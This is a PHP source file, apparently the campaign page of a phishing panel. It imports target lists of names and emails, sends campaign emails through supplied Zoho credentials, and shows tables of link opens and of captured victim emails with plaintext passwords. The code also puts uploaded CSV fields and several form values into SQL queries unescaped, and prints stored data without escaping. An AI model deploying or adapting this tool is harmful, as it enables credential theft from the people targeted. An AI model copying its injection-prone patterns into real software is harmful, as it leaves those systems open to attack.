<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

if(file_exists('db/conn.php')){
	include 'db/conn.php';
}
else{
	include '../db/conn.php';
}

if(!isset($_SESSION["username"])){
    header("Location: ../login.php");
}


if(isset($_GET['update']) && isset($_GET['id'])){
	$sql = "SELECT * FROM targets where compaign_id='".mysqli_real_escape_string($conn, $_GET['id'])."'";
        $result = mysqli_query($conn, $sql);

        if (mysqli_num_rows($result) > 0) {
          // output data of each row
        	$out="";
          while($row = mysqli_fetch_assoc($result)) {
                $out.= '<tr>
                            <td>'.$row["first_name"].'</td>
                            <td>'.$row["last_name"].'</td>
                            <td>'.$row["email"].'</td>
                            <td>'.$row["status"].'</td>
                        </tr>';
          }
          echo $out;
          die();
        }
        else{
        	echo "error";
        }
}

$msg="";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if(isset($_FILES["file"])){
     	$file = $_FILES["file"]["tmp_name"];
		$file_open = fopen($file,"r");
		$compaign_id = mysqli_real_escape_string($conn, $_GET['id']);
		while(($csv = fgetcsv($file_open, 1000, ",")) !== false)
		{

		    $sql = "INSERT INTO targets (first_name,last_name,email,compaign_id)
	        VALUES ('".$csv[0]."','".$csv[1]."','".$csv[2]."','".$compaign_id."')";

	        if ($conn->query($sql) === TRUE) {

	        }
		}
     }

     if(isset($_POST["url"]) && isset($_POST["template"]) && isset($_POST["zm_email"]) && isset($_POST["zm_password"])){

		$compaign_id = mysqli_real_escape_string($conn, $_GET['id']);
		$url = mysqli_real_escape_string($conn, $_POST['url']);
	   $sql = "INSERT INTO phishing (url,template,zm_email,zm_password,compaign_id,title)
        VALUES ('".$url."', '".base64_encode($_POST["template"])."','".$_POST["zm_email"]."','".$_POST["zm_password"]."','".$compaign_id."', '".$_POST["title"]."')";

        if ($conn->query($sql) === TRUE) {
        	$msg = "<p style='color:green;'>Compaign Started!</p>";
        }
        else{
			$msg = "<p style='color:green;'>Unable to start compaign</p>";
        }
     }
}


if(isset($_GET['action'])){
	echo '            <div class="card shadow mb-4">
                        <div class="card-header py-3">
                            <h6 class="m-0 font-weight-bold text-primary">Link Open Stats</h6>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered" id="dataTable" width="100%" cellspacing="0">
                                    <thead>
                                        <tr>
                                            <th>Email</th>
                                            <th>Time</th>
                                        </tr>
                                    </thead>
                                    <tbody>';

        $sql = "SELECT * FROM link_opens where compaign_id='".mysqli_real_escape_string($conn, $_GET['id'])."'";
        $result = mysqli_query($conn, $sql);

        if (mysqli_num_rows($result) > 0) {
          // output data of each row
          while($row = mysqli_fetch_assoc($result)) {
                echo '<tr>
                            <td>'.$row["email"].'</td>
                            <td>'.$row["time"].'</td>
                        </tr>';
          }
        }

        echo '</tbody>
                                </table>
                            </div>
                        </div>
                    </div>';



     echo '            <div class="card shadow mb-4">
                        <div class="card-header py-3">
                            <h6 class="m-0 font-weight-bold text-primary">Credential Submission Stats</h6>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered" id="dataTable" width="100%" cellspacing="0">
                                    <thead>
                                        <tr>
                                            <th>Email</th>
                                            <th>Password</th>
                                        </tr>
                                    </thead>
                                    <tbody>';

        $sql = "SELECT * FROM creds where compaign_id='".mysqli_real_escape_string($conn, $_GET['id'])."'";
        $result = mysqli_query($conn, $sql);

        if (mysqli_num_rows($result) > 0) {
          // output data of each row
          while($row = mysqli_fetch_assoc($result)) {
                echo '<tr>
                            <td>'.$row["email"].'</td>
                            <td>'.$row["password"].'</td>
                        </tr>';
          }
        }

        echo '</tbody>
                                </table>
                            </div>
                        </div>
                    </div>';
               die();
}


        echo '<a href="#" class="btn btn-primary btn-icon-split" data-toggle="collapse" data-target="#collapseTwo"
                    aria-expanded="true" aria-controls="collapseTwo">
                                        <span class="icon text-white-50">
                                            <i class="fas fa-flag"></i>
                                        </span>
                                        <span class="text">Add Targets</span>
                                    </a>

<div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionSidebar">
                    <div class="bg-white py-2 collapse-inner rounded">
                        <form class="user" method="POST" enctype="multipart/form-data">
                                        <div class="form-group">
                                            <input type="file" class="form-control form-control-user"
                                                id="exampleInputEmail" name="file" aria-describedby="emailHelp"
                                                placeholder="Enter Name">
                                        </div>
                                        <button type="submit" name="submit" class="btn btn-primary btn-user btn-block">
                                            Add
                                        </button>
                                    </form>
                    </div>
                </div>

                <a href="#" class="btn btn-primary btn-icon-split" data-toggle="collapse" data-target="#collapseTwo1"
                    aria-expanded="true" aria-controls="collapseTwo1">
                                        <span class="icon text-white-50">
                                            <i class="fa fa-play"></i>
                                        </span>
                                        <span class="text">Start Compaign</span>
                                    </a>
                <div id="collapseTwo1" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionSidebar">
                    <div class="bg-white py-2 collapse-inner rounded">
                        <form class="user" method="POST">
                                        <div class="form-group">
                                            <input type="text" class="form-control form-control-user"
                                                id="exampleInputEmail" name="url" aria-describedby="emailHelp"
                                                placeholder="Enter URL">
                                        </div>
                                        <div class="form-group">
                                            <textarea type="text" style="border-radius: 0;" class="form-control form-control-user"
                                                id="exampleInputEmail" name="title" aria-describedby="emailHelp"
                                                placeholder="Enter Email Title"></textarea>
                                        </div>
                                        <div class="form-group">
                                            <textarea type="text" style="border-radius: 0;" class="form-control form-control-user"
                                                id="exampleInputEmail" name="template" aria-describedby="emailHelp"
                                                placeholder="Enter Email Template"></textarea>
                                        </div>
                                        <div class="form-group">
                                            <input type="text" class="form-control form-control-user"
                                                id="exampleInputEmail" name="zm_email" aria-describedby="emailHelp"
                                                placeholder="Enter Zoho Email">
                                        </div>
                                        <div class="form-group">
                                            <input type="password" class="form-control form-control-user"
                                                id="exampleInputEmail" name="zm_password" aria-describedby="emailHelp"
                                                placeholder="Enter Zoho Password">
                                        </div>
                                        <button type="submit" name="submit" class="btn btn-primary btn-user btn-block">
                                            Start
                                        </button>
                                    </form>
                    </div>
                </div>
                <a href="?include=reports.php&id='.$_GET['id'].'&action=stats" class="btn btn-primary btn-icon-split">
                                        <span class="text">Show Report</span>
                                    </a>
                  '.$msg.'
                                    <hr>

                                    <div class="card shadow mb-4">
                        <div class="card-header py-3">
                            <h6 class="m-0 font-weight-bold text-primary">Compaigns</h6>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered targets" id="dataTable" width="100%" cellspacing="0">
                                    <thead>
                                        <tr>
                                            <th>First Name</th>
                                            <th>Last Name</th>
                                            <th>Email</th>
                                            <th>Status</th>
                                        </tr>
                                    </thead>
                                    <tbody>';
                                    

        $sql = "SELECT * FROM targets where compaign_id='".mysqli_real_escape_string($conn, $_GET['id'])."'";
        $result = mysqli_query($conn, $sql);

        if (mysqli_num_rows($result) > 0) {
          // output data of each row
          while($row = mysqli_fetch_assoc($result)) {
                echo '<tr>
                            <td>'.$row["first_name"].'</td>
                            <td>'.$row["last_name"].'</td>
                            <td>'.$row["email"].'</td>
                            <td>'.$row["status"].'</td>
                        </tr>';
          }
        }

        echo '</tbody>
                                </table>
                            </div>
                        </div>
                    </div>';


?>